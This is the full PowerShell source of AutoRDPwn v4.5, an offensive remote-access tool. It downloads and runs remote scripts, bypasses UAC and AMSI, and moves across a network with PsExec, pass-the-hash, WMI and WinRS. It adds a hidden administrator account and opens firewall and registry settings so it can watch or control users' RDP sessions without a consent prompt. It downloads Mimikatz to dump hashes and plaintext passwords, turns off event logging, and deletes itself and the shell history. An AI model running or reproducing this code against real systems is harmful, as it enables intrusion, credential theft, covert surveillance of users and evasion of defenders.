[Console]::OutputEncoding = [System.Text.Encoding]::GetEncoding("utf-8")
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/AutoBypass.ps1" -UseBasicParsing | iex
if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) { Bypass-UAC "powershell.exe -sta -NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" ; exit }
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Design/ColorTool.zip" -Outfile ColorTool.zip -UseBasicParsing ; Expand-Archive .\ColorTool.zip -Force ; .\ColorTool\ColorTool.exe -b campbell 2>&1> $null ; del ColorTool.zip ; cmd /c "rd /s /q ColorTool"
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Design/AutoRDPwn.ico" -OutFile AutoRDPwn.ico -UseBasicParsing ; Invoke-WebRequest -Uri "https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Design/Set-ConsoleIcon.ps1" -OutFile Set-ConsoleIcon.ps1 -UseBasicParsing ; .\Set-ConsoleIcon.ps1 AutoRDPwn.ico ; del Set-ConsoleIcon.ps1,AutoRDPwn.ico
$Host.UI.RawUI.BackgroundColor = 'Black' ; $Host.UI.RawUI.ForegroundColor = 'Gray' ; $Host.PrivateData.ErrorForegroundColor = 'Red' ; $Host.PrivateData.WarningForegroundColor = 'Magenta' ; $Host.PrivateData.DebugForegroundColor = 'Yellow' ; $Host.PrivateData.VerboseForegroundColor = 'Green' ; $Host.PrivateData.ProgressForegroundColor = 'White' ; $Host.PrivateData.ProgressBackgroundColor = 'Blue'
$Host.UI.RawUI.WindowTitle = "AutoRDPwn - v4.5 - by @JoelGMSec" ; $ErrorActionPreference = "SilentlyContinue" ; Set-StrictMode -Off

function Show-Banner { Clear-Host
     Write-Host ""
     Write-Host "    _____         __       " -NoNewLine -ForegroundColor Magenta ; Write-Host "___________________________ " -NoNewLine -ForegroundColor Blue ; Write-Host "               " -ForegroundColor Green
     Write-Host "   /  _  \  __ __|  |_ ____" -NoNewLine -ForegroundColor Magenta ; Write-Host "\______   \______ \______  \" -NoNewLine -ForegroundColor Blue ; Write-Host "  _  ________ " -ForegroundColor Green
     Write-Host "  /  / \  \|  |  |   _| _  \" -NoNewLine -ForegroundColor Magenta ; Write-Host "|       _/|     \ |    ___/" -NoNewLine -ForegroundColor Blue ; Write-Host "\/ \/  /     \ " -ForegroundColor Green
     Write-Host " /  /___\  \  |  |  |  (_)  " -NoNewLine -ForegroundColor Magenta ; Write-Host "|   |    \|_____/ |   |" -NoNewLine -ForegroundColor Blue ; Write-Host " \        /   |   \" -ForegroundColor Green
     Write-Host " \  _______/_____/__|\_____/" -NoNewLine -ForegroundColor Magenta ; Write-Host "|___|__  /_______/|___|" -NoNewLine -ForegroundColor Blue ; Write-Host "  \__/\__/|___|_  /" -ForegroundColor Green
     Write-Host "  \/                        " -NoNewLine -ForegroundColor Magenta ; Write-Host "       \/              " -NoNewLine -ForegroundColor Blue ; Write-Host "                \/ " -ForegroundColor Green
     Write-Host ""
     Write-Host "::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::" -ForegroundColor Gray
     Write-Host "::" -NoNewLine -ForegroundColor Gray ; Write-Host "  The Shadow Attack Framework" -NoNewLine -ForegroundColor Yellow ; Write-Host "  :: " -NoNewLine -ForegroundColor Gray ; Write-Host "v4.5" -NoNewLine -ForegroundColor Yellow ; Write-Host " ::" -NoNewLine -ForegroundColor Gray ; Write-Host "  Created by @JoelGMSec" -NoNewLine -ForegroundColor Yellow ; Write-Host "  ::" -ForegroundColor Gray
     Write-Host "::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::" -ForegroundColor Gray
     Write-Host "" }

function Show-Language { $Host.UI.RawUI.ForegroundColor = 'Gray'
     Write-Host "[1] - English"
     Write-Host "[2] - Spanish"
     Write-Host "[X] - Exit"
     Write-Host "" }

function Show-Menu { $Host.UI.RawUI.ForegroundColor = 'Gray'
     Write-Host "[1] - PsExec"
     Write-Host "[2] - Pass the Hash"
     Write-Host "[3] - Windows Management Instrumentation"
     Write-Host "[4] - InvokeCommand / PSSession"
     Write-Host "[5] - Windows Remote Assistance"
     Write-Host "[6] - Session Hijacking (local)"
     Write-Host "[M] - $txt1"
     Write-Host "[X] - $txt2"
     Write-Host "" }

function ConvertFrom-SecureToPlain {
    param([Parameter(Mandatory=$true)][System.Security.SecureString] $SecurePassword)
    $PasswordPointer = [Runtime.InteropServices.Marshal]::SecureStringToBSTR($SecurePassword)
    $PlainTextPassword = [Runtime.InteropServices.Marshal]::PtrToStringAuto($PasswordPointer)
    [Runtime.InteropServices.Marshal]::ZeroFreeBSTR($PasswordPointer)
    $PlainTextPassword }

function Test-Command {
    Param ($command)
    $oldPreference = $ErrorActionPreference
    $ErrorActionPreference = 'stop'
    try {if(Get-Command $command){RETURN $true}}
    Catch {RETURN $false}
    Finally {$ErrorActionPreference=$oldPreference}}
    
    do { Show-Banner ; Show-Language
    $input = Read-Host -Prompt "Choose your language"
    switch ($input) { 
       '1' { $Language = 'English' } 
       '2' { $Language = 'Spanish' } 
       'X' { continue }
    default { Write-Host"" ; Write-Host "Wrong option, please try again" -ForegroundColor Magenta ; sleep -milliseconds 2000 }}} until ($input -in '1','2','X') if($input -in '1','2'){

if($Language -in 'English') {
  $txt1  = "Load additional modules"
  $txt2  = "Close the program"
  $txt3a = "Your version of Powershell is not compatible with this script :("
  $txt3b = "You can download the latest version here"
  $txt3c = "Your operating system is not compatible with this attack, choose another one"
  $txt4  = "Incorrect option, try again"
  $txt5  = "Choose how you want to launch the attack"
  $txt6  = "Choose the module you want to load"
  $txt7a = "Recover local hashes"
  $txt7b = "Recover plaintext passwords"
  $txt8a = "System"
  $txt8b = "detected, downloading Mimikatz.."
  $txt9a = "Semi-interactive console"
  $txt9b = "Deactivate system logs"
  $txt9c = "This process can take several minutes.."
  $txt10 = "Module loaded successfully!"
  $txt11 = "Return to the main menu"
  $txt12 = "What is the IP of the server?"
  $txt13 = "And the user?"
  $txt14 = "Enter the password"
  $txt15 = "Enter the domain"
  $txt16 = "Finally, the NTLM hash"
  $txt17 = "Do you want to connect through PSSession?"
  $txt18 = "Elevating privileges with token duplication.."
  $txt19 = "Do you want to see or control the computer?"
  $txt20 = "Modifying permissions to view the remote computer.."
  $txt21 = "Modifying permissions to control the remote computer.."
  $txt22 = "Changes in the Windows registry made successfully"
  $txt23 = "Detecting operating system version on"
  $txt24 = "detected"
  $txt25 = "Looking for active sessions on the computer.."
  $txt26 = "What session do you want to connect to?"
  $txt27 = "detected, applying patch.."
  $txt28 = "Starting remote connection.."
  $txt29 = "Semi-interactive console on remote computer"
  $txt30 = "Something went wrong, closing the program.."
  $Pwn1  = "Set-NetConnectionProfile -InterfaceAlias 'Ethernet *' -NetworkCategory Private; Set-NetConnectionProfile -InterfaceAlias 'Wi-Fi *' -NetworkCategory Private; winrm quickconfig -quiet; Enable-PSRemoting -Force"
  $Pwn2  = "netsh advfirewall firewall set rule group = 'Remote Assistance' new enable = Yes"
  $Pwn3  = "netsh advfirewall firewall set rule group = 'Network Discovery' new enable = Yes; netsh advfirewall firewall set rule group = 'Remote Scheduled Tasks Management' new enable = yes"
  $Pwn4  = "netsh advfirewall firewall set rule group = 'Windows Management Instrumentation (WMI)' new enable = yes; netsh advfirewall firewall set rule group = 'Windows Remote Management' new enable = yes"
  $Pwn5  = "net user AutoRDPwn AutoRDPwn / add; net localgroup Administrators AutoRDPwn / add"
  $Pwn6  = "RDP session agent" }

if($Language -in 'Spanish') {
  $txt1  = "Cargar módulos adicionales"
  $txt2  = "Cerrar el programa"
  $txt3a = "Tu versión de Powershell no es compatible con este script :("
  $txt3b = "Puedes decargar la última versión aquí"
  $txt3c = "Tu sistema operativo no es compatible con este ataque, elige otro"
  $txt4  = "Opción incorrecta, vuelve a intentarlo de nuevo"
  $txt5  = "Elige cómo quieres lanzar el ataque"
  $txt6  = "Elige el módulo que quieres cargar"
  $txt7a = "Recuperar hashes locales"
  $txt7b = "Recuperar contraseñas en texto plano"
  $txt8a = "Sistema de"
  $txt8b = "detectado, descargando Mimikatz.."
  $txt9a = "Consola semi-interactiva"
  $txt9b = "Desactivar logs del sistema"
  $txt9c = "Este proceso puede tardar varios minutos.."
  $txt10 = "Módulo cargado con éxito!"
  $txt11 = "Volver al menú principal"
  $txt12 = "Cuál es la IP del servidor?"
  $txt13 = "Y el usuario?"
  $txt14 = "Escribe la contraseña"
  $txt15 = "Introduce el dominio"
  $txt16 = "Por último, el hash NTLM"
  $txt17 = "Quieres conectarte a través de PSSession?"
  $txt18 = "Elevando privilegios con token duplication.."
  $txt19 = "Quieres ver o controlar el equipo?"
  $txt20 = "Modificando permisos para visualizar el equipo remoto.."
  $txt21 = "Modificando permisos para controlar el equipo remoto.."
  $txt22 = "Cambios en el registro de Windows realizados con éxito"
  $txt23 = "Detectando versión del sistema operativo en"
  $txt24 = "detectado"
  $txt25 = "Buscando sesiones activas en el equipo.."
  $txt26 = "A qué sesión quieres conectarte?"
  $txt27 = "detectado, aplicando parche.."
  $txt28 = "Iniciando conexión remota.."
  $txt29 = "Consola semi-interactiva en equipo remoto"
  $txt30 = "Algo salió mal, cerrando el programa.."
  $Pwn1  = "Set-NetConnectionProfile -InterfaceAlias 'Ethernet*' -NetworkCategory Private ; Set-NetConnectionProfile -InterfaceAlias 'Wi-Fi*' -NetworkCategory Private ; winrm quickconfig -quiet ; Enable-PSRemoting -Force"
  $Pwn2  = "netsh advfirewall firewall set rule group='Asistencia Remota' new enable=Yes"
  $Pwn3  = "netsh advfirewall firewall set rule group='Detección de redes' new enable=Yes ; netsh advfirewall firewall set rule group='Administración Remota de tareas programadas' new enable=yes"
  $Pwn4  = "netsh advfirewall firewall set rule group='Instrumental de Administración de Windows (WMI)' new enable=yes ; netsh advfirewall firewall set rule group='Administración remota de Windows' new enable=yes"
  $Pwn5  = "net user AutoRDPwn AutoRDPwn /add ; net localgroup Administradores AutoRDPwn /add"
  $Pwn6  = "Agente de sesión de RDP" }

    $Powershell = (Get-Host | findstr "Version" | select -First 1).split(':')[1].trim() ; Write-Host""
    if($Powershell -lt 5) { Write-Host "$txt3a" -ForegroundColor 'Red' ; Write-Host "" ; Write-Host "$txt3b" -NoNewLine -ForegroundColor 'Red'
    Write-Host "" -NoNewLine ; Write-Host " http://aka.ms/wmf5download" -NoNewLine -ForegroundColor 'Blue' ; Write-Host "" ; sleep -milliseconds 6000 ; exit } 
    else { $osarch = wmic path Win32_OperatingSystem get OSArchitecture | findstr 'bits' ; $system = $osarch.trim()
    if($system -in '64 bits') { $Host.UI.RawUI.ForegroundColor = 'Black' ; Bypass-AMSI } else { $null }}

    do { Show-Banner ; Show-Menu
    $input = Read-Host -Prompt "$txt5"
    switch ($input) {

        '1' {
        Write-Host ""
        $computer = Read-Host -Prompt "$txt12"
        Write-Host ""
        $user = Read-Host -Prompt "$txt13"
        Write-Host ""
        $password = Read-Host -AsSecureString -Prompt "$txt14"
        $PlainTextPassword = ConvertFrom-SecureToPlain $password
        Write-Host ""
        $Host.UI.RawUI.ForegroundColor = 'Blue'
        Invoke-WebRequest -Uri "https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Executables/psexec.exe" -OutFile "psexec.exe" -UseBasicParsing
        .\psexec.exe \\$computer -u $user -p $PlainTextPassword -h -d powershell.exe "$Pwn1" -accepteula
        .\psexec.exe \\$computer -u $user -p $PlainTextPassword -h -d powershell.exe "$Pwn2" -accepteula
        .\psexec.exe \\$computer -u $user -p $PlainTextPassword -h -d powershell.exe "$Pwn3" -accepteula
        .\psexec.exe \\$computer -u $user -p $PlainTextPassword -h -d powershell.exe "$Pwn4" -accepteula
        del .\psexec.exe }

        '2' {
	Write-Host ""
        $computer = Read-Host -Prompt "$txt12"
        Write-Host ""
        $user = Read-Host -Prompt "$txt13"
	Write-Host ""
        $domain = Read-Host -Prompt "$txt15"
        Write-Host ""
        $hash = Read-Host -Prompt "$txt16"
        Write-Host ""
        $Host.UI.RawUI.ForegroundColor = 'Blue'
        Invoke-WebRequest -Uri "https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Invoke-SMBExec.ps1" -UseBasicParsing | iex
        Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $hash -Command "powershell.exe $Pwn1"
        Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $hash -Command "powershell.exe $Pwn2"
        Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $hash -Command "powershell.exe $Pwn3"
        Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $hash -Command "powershell.exe $Pwn4"
        Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $hash -Command "powershell.exe $Pwn5" }

	'3' {
        Write-Host ""
        $computer = Read-Host -Prompt "$txt12"
        Write-Host ""
        $user = Read-Host -Prompt "$txt13"
        Write-Host ""
        $password = Read-Host -AsSecureString -Prompt "$txt14"
	$PlainTextPassword = ConvertFrom-SecureToPlain $password
        Write-Host ""
        $Host.UI.RawUI.ForegroundColor = 'Blue'
        wmic /node:$computer /user:$user /password:$PlainTextPassword path win32_process call create "powershell.exe $Pwn1"
        wmic /node:$computer /user:$user /password:$PlainTextPassword path win32_process call create "powershell.exe $Pwn2"
        wmic /node:$computer /user:$user /password:$PlainTextPassword path win32_process call create "powershell.exe $Pwn3"
        wmic /node:$computer /user:$user /password:$PlainTextPassword path win32_process call create "powershell.exe $Pwn4" }

        '4' {
        Write-Host ""
        $computer = Read-Host -Prompt "$txt12"
        Write-Host ""
        $user = Read-Host -Prompt "$txt13"
        Write-Host ""
        $password = Read-Host -AsSecureString -Prompt "$txt14"
        $credential = New-Object System.Management.Automation.PSCredential ( $user, $password )
        Write-Host ""
        $Host.UI.RawUI.ForegroundColor = 'Blue'
        $PSSession = New-PSSession -Computer $computer -credential $credential 
        Invoke-Command -Session $PSSession -ScriptBlock { powershell.exe $using:Pwn1 }
        Invoke-Command -Session $PSSession -ScriptBlock { powershell.exe $using:Pwn2 }
        Invoke-Command -Session $PSSession -ScriptBlock { powershell.exe $using:Pwn3 }
        Invoke-Command -Session $PSSession -ScriptBlock { powershell.exe $using:Pwn4 }}

        '5' {
        Write-Host ""
        $computer = Read-Host -Prompt "$txt12"
        Write-Host ""
        $user = Read-Host -Prompt "$txt13"
        Write-Host ""
        $password = Read-Host -AsSecureString -Prompt "$txt14"
	$PlainTextPassword = ConvertFrom-SecureToPlain $password
	Write-Host ""
        $Host.UI.RawUI.ForegroundColor = 'Blue'
        WinRS -r:$computer -u:$user -p:$PlainTextPassword "powershell.exe $Pwn1"
        WinRS -r:$computer -u:$user -p:$PlainTextPassword "powershell.exe $Pwn2"
        WinRS -r:$computer -u:$user -p:$PlainTextPassword "powershell.exe $Pwn3"
        WinRS -r:$computer -u:$user -p:$PlainTextPassword "powershell.exe $Pwn4" }
	
	'6' {
        Write-Host ""
        $test = Test-Command tscon ; if($test -in 'True'){
        Write-Host "$txt18" -ForegroundColor Yellow
        $Host.UI.RawUI.ForegroundColor = 'Green' ; Write-Host ""
	Invoke-WebRequest -Uri "https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Get-System.ps1" -UseBasicParsing | iex
        Get-System -Technique Token
        Write-Host ""; Write-Host "$using:txt25" ; $Host.UI.RawUI.ForegroundColor = 'Gray'  
        query session ; Write-Host "" ; $tscon = Read-Host -Prompt "$txt26"
	tscon $tscon 2>&1> $null ; if($? -in 'True'){ continue } else{ $tsfail = 'True' }}
        else{ Write-Host "$txt3c" -ForegroundColor Red ; sleep -milliseconds 3000 ; $input = $null ; Show-Banner ; Show-Menu }}

        'M' {
        Clear-Host; Show-Banner ; Write-Host "[1] - Mimikatz" ; Write-Host "[2] - $txt9a" ; Write-Host "[3] - $txt9b" ; Write-Host "[4] - Remote Desktop Caching"
        Write-Host "[M] - $txt11" ; Write-Host "" ; $module = Read-Host -Prompt "$txt6" ; Write-Host ""
        if($module -like '1') { Clear-Host; Show-Banner ; Write-Host "[1] - $txt7a" ; Write-Host "[2] - $txt7b" ; Write-Host "[M] - $txt11" ; Write-Host ""
        $mimikatz = Read-Host -Prompt "$txt6" ; Write-Host ""

        if($mimikatz -like '1') { Write-Host "$txt10" -ForegroundColor Green ; sleep -milliseconds 2000
	$osarch = wmic path Win32_OperatingSystem get OSArchitecture | findstr 'bits' ; $system = $osarch.trim()
        Write-Host "" ; Write-Host "$txt8a $system $txt8b" -ForegroundColor Green
	Invoke-WebRequest -Uri "https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Executables/mimikatz.zip" -UseBasicParsing -Outfile mimikatz.zip
	Expand-Archive .\mimikatz.zip -Force
	if($system -in '32 bits') { $mimipath = ".\mimikatz\Win32\" }
	if($system -in '64 bits') { $mimipath = ".\mimikatz\x64\" }
        powershell $mimipath\mimikatz.exe privilege::debug token::elevate lsadump::sam exit
        Write-Host "" ; pause ; del .\mimikatz.zip ; cmd /c "rd /s /q mimikatz" }

        if($mimikatz -like '2') { Write-Host "$txt10" -ForegroundColor Green ; sleep -milliseconds 2000
	$osarch = wmic path Win32_OperatingSystem get OSArchitecture | findstr 'bits' ; $system = $osarch.trim()
        Write-Host "" ; Write-Host "$txt8a $system $txt8b" -ForegroundColor Green
	Invoke-WebRequest -Uri "https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Executables/mimikatz.zip" -UseBasicParsing -Outfile mimikatz.zip
	Expand-Archive .\mimikatz.zip -Force
	if($system -in '32 bits') { $mimipath = ".\mimikatz\Win32\" }
	if($system -in '64 bits') { $mimipath = ".\mimikatz\x64\" }
        powershell $mimipath\mimikatz.exe 'privilege::debug token::elevate sekurlsa::logonPasswords` full exit'
        Write-Host "" ; pause ; del .\mimikatz.zip ; cmd /c "rd /s /q mimikatz" }

        if($mimikatz -in '1','2','m') { $null }
        else { Write-Host "$txt4" -ForegroundColor Magenta }}
        if($module -like '2') { $console ="true" ; Write-Host "$txt10" -ForegroundColor Green }

        if($module -like '3') { Write-Host "$txt10" -ForegroundColor Green 
        Invoke-WebRequest -Uri "https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Invoke-Phant0m.ps1" -UseBasicParsing | iex
        Invoke-Phant0m ; pause }

        if($module -like '4') { Write-Host "$txt10" -ForegroundColor Green ; Write-Host ; Write-Host "$txt9c" -ForegroundColor Magenta
        Invoke-WebRequest -Uri https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/RDP-Caching.ps1 -UseBasicParsing | iex ; explorer $env:temp\Recovered_RDP_Session 
	Write-Host "" ; pause ; cmd /c "rd /s /q $env:temp\Recovered_RDP_Session" }
        if($module -in '1','2','3','4','m') { $null }
        else { Write-Host "$txt4" -ForegroundColor Magenta } sleep -milliseconds 2000 }

        'X' { continue }

        default { Write-Host "" ; Write-Host "$txt4" -ForegroundColor Magenta ; sleep -milliseconds 2000 }}} until ($input -in '1','2','3','4','5','6','X')
   
   if($input -in '1','2','3','4','5'){ $Host.UI.RawUI.ForegroundColor = 'Gray' ; Write-Host "" ; if ($hash) { echo "AutoRDPwn" > credentials.dat
   $user = type credentials.dat ; $password = type credentials.dat | ConvertTo-SecureString -AsPlainText -Force ; del credentials.dat }
   $Host.UI.RawUI.ForegroundColor = 'Yellow' ; winrm quickconfig -quiet ; Set-Item wsman:\localhost\client\trustedhosts * -Force
   Set-NetConnectionProfile -InterfaceAlias "Ethernet*" -NetworkCategory Private ; Set-NetConnectionProfile -InterfaceAlias "Wi-Fi*" -NetworkCategory Private
   Set-ItemProperty -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name LocalAccountTokenFilterPolicy -Value 1 -Type DWord 2>&1> $null
   $credential = New-Object System.Management.Automation.PSCredential ( $user, $password ) ; $RDP = New-PSSession -Computer $computer -credential $credential
   $session = get-pssession ; if ($session){ 

        do { $Host.UI.RawUI.ForegroundColor = 'Gray'  
        Write-Host "" ; $input = Read-Host -Prompt "$txt19"
        switch -wildcard ($input) {

        'ver' { $control = "false" ; Write-Host "" ;
	invoke-command -session $RDP[0] -scriptblock { $Host.UI.RawUI.ForegroundColor = 'Green'
        powershell Set-Executionpolicy UnRestricted
        REG DELETE "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow /f 2>&1> $null
        REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow /t REG_DWORD /d 4 2>&1> $null 
	Write-Host "$using:txt20" }}

        'see' { $control = "false" ; Write-Host ""  
	invoke-command -session $RDP[0] -scriptblock { $Host.UI.RawUI.ForegroundColor = 'Green'
        powershell Set-Executionpolicy UnRestricted
        REG DELETE "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow /f 2>&1> $null
        REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow /t REG_DWORD /d 4 2>&1> $null 
	Write-Host "$using:txt20" }}

        'control*' { $control = "true" ; Write-Host "" 
	invoke-command -session $RDP[0] -scriptblock { $Host.UI.RawUI.ForegroundColor = 'Green'
        powershell Set-Executionpolicy UnRestricted
        REG DELETE "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow /f 2>&1> $null
        REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow /t REG_DWORD /d 2 2>&1> $null 
	Write-Host "$using:txt21" }}

        default { Write-Host "" ; Write-Host "$txt4" -ForegroundColor Magenta ; sleep -milliseconds 2000 }}} until ($input -in 'ver','see','controlar','control')

    invoke-command -session $RDP[0] -scriptblock {
    REG DELETE "HKLM\SOFTWARE\Microsoft\WBEM\CIMOM" /v AllowAnonymousCallback /f 2>&1> $null
    REG ADD "HKLM\SOFTWARE\Microsoft\WBEM\CIMOM" /v AllowAnonymousCallback /t REG_DWORD /d 1 2>&1> $null
    REG DELETE "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v AllowRemoteRPC /f 2>&1> $null
    REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v AllowRemoteRPC /t REG_DWORD /d 1 2>&1> $null
    REG DELETE "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /f 2>&1> $null
    REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 2>&1> $null
    REG DELETE "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /f 2>&1> $null
    REG ADD "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 0 2>&1> $null
    REG DELETE "HKLM\System\CurrentControlSet\Control\Remote Assistance" /v fAllowToGetHelp /f 2>&1> $null
    REG ADD "HKLM\System\CurrentControlSet\Control\Remote Assistance" /v fAllowToGetHelp /t REG_DWORD /d 1 2>&1> $null
    REG DELETE "HKLM\System\CurrentControlSet\Control\Remote Assistance" /v fAllowFullControl /f 2>&1> $null
    REG ADD "HKLM\System\CurrentControlSet\Control\Remote Assistance" /v fAllowFullControl /t REG_DWORD /d 1 2>&1> $null
    Write-Host "" ; Write-Host "$using:txt22" }
    $hostname = invoke-command -session $RDP[0] -scriptblock {(systeminfo | findstr /I "host" | select -First 1).split(':')[1].trim()}
    Write-Host "" ; Write-Host "$txt23 $hostname.." -ForegroundColor Magenta
    $version = invoke-command -session $RDP[0] -scriptblock {(systeminfo | findstr "Microsoft Windows" | select -First 1).split(':')[1].trim()}
    $Host.UI.RawUI.ForegroundColor = 'Gray' ; Write-Host ""

        if($version -Like '*Server*') { Write-Host "$version $using:txt24"
        invoke-command -session $RDP[0] -scriptblock { $Host.UI.RawUI.ForegroundColor = 'Yellow' ; Write-Host ""
        (Get-WmiObject -class Win32_TSGeneralSetting -Namespace root\cimv2\terminalservices -Filter "TerminalName='RDP-tcp'").SetUserAuthenticationRequired(0) 2>&1> $null
        Write-Host "$using:txt25" ; $Host.UI.RawUI.ForegroundColor = 'Gray' ; query session } 
        Write-Host "" ; $shadow = Read-Host -Prompt "$txt26" 
        if($control -eq 'true') { mstsc /v $computer /admin /shadow:$shadow /control /noconsentprompt /prompt /f }
        else { mstsc /v $computer /admin /shadow:$shadow /noconsentprompt /prompt /f }}

        else { Write-Host "$version $txt27"
        invoke-command -session $RDP[0] -scriptblock {
        add-type @"
        using System.Net;
        using System.Security.Cryptography.X509Certificates;
        public class TrustAllCertsPolicy : ICertificatePolicy {
        public bool CheckValidationResult(
        ServicePoint srvPoint, X509Certificate certificate,
        WebRequest request, int certificateProblem) { return true; }}
"@;     $AllProtocols = [System.Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12'
        [System.Net.ServicePointManager]::SecurityProtocol = $AllProtocols
        [System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy }

    invoke-command -session $RDP[0] -scriptblock { 
    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Executables/RDPWInst-v1.6.2.msi" -OutFile "RDPWInst-v1.6.2.msi" -UseBasicParsing
    msiexec /i "RDPWInst-v1.6.2.msi" /quiet /qn /norestart ; netsh advfirewall firewall delete rule name="$using:Pwn6" 2>&1> $null
    netsh advfirewall firewall add rule name="$using:Pwn6" dir=in protocol=udp action=allow program="C:\Windows\System32\rdpsa.exe" enable=yes 2>&1> $null
    netsh advfirewall firewall add rule name="$using:Pwn6" dir=in protocol=tcp action=allow program="C:\Windows\System32\rdpsa.exe" enable=yes 2>&1> $null
    attrib +h 'C:\Program Files\RDP Wrapper' 2>&1> $null ; attrib +h 'C:\Program Files (x86)\RDP Wrapper' 2>&1> $null ; sleep -milliseconds 7500 ; rm .\RDPWInst-v1.6.2.msi 2>&1> $null } 
    
    $shadow = invoke-command -session $RDP[0] -scriptblock {(Get-Process explorer | Select-Object SessionId | Format-List | findstr "Id" | select -First 1).split(':')[1].trim()}
    $Host.UI.RawUI.ForegroundColor = 'Yellow' ; Write-Host "" ; Write-Host "$txt25" ; sleep -milliseconds 2000 
    if($control -eq 'true') { mstsc /v $computer /admin /shadow:$shadow /control /noconsentprompt /prompt /f }
    else { mstsc /v $computer /admin /shadow:$shadow /noconsentprompt /prompt /f }}

if ($hash){ invoke-command -session $RDP[0] -scriptblock { $script = "Write-Output '`$AutoRDPwn = ls C:\Users\AutoRDPwn* | %{Write-Output `$_.Name}' | iex"
$script2 = 'net user AutoRDPwn /delete ; cmd.exe /c rd /s /q C:\Users\$AutoRDPwn ; Unregister-ScheduledTask -TaskName AutoRDPwn -Confirm:$false ; $PScript = $MyInvocation.MyCommand.Definition ; Remove-Item $PScript'
echo $script > $env:TEMP\script.ps1 ; echo $script2 >> $env:TEMP\script.ps1 ; $file = "$env:TEMP\script.ps1"
$action = New-ScheduledTaskAction -Execute powershell -Argument "-ExecutionPolicy ByPass -NoProfile -WindowStyle Hidden $file" ; $time = (Get-Date).AddHours(+2) ; $trigger =  New-ScheduledTaskTrigger -Once -At $time
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "AutoRDPwn" -Description "AutoRDPwn" -TaskPath Microsoft\Windows\Powershell\ScheduledJobs -User "System" > $null }}

Write-Host "" ; $Host.UI.RawUI.ForegroundColor = 'Gray' ;  Write-Host "$txt28" ; sleep -milliseconds 3000 
if ($console){ $PlainTextPassword = ConvertFrom-SecureToPlain $password ; Clear-Host ; Write-Host ">> $txt29 <<" ; Write-Host "" ; WinRS -r:$computer -u:$user -p:$PlainTextPassword "cmd" }}
else { Write-Host "" ; Write-Host "$txt30" -ForegroundColor Red ; sleep -milliseconds 3000 }} if($tsfail) { Write-Host "" ; Write-Host "$txt30" -ForegroundColor Red ; sleep -milliseconds 3000 }}
$PScript = $MyInvocation.MyCommand.Definition ; Remove-Item $PScript ; del (Get-PSReadlineOption).HistorySavePath
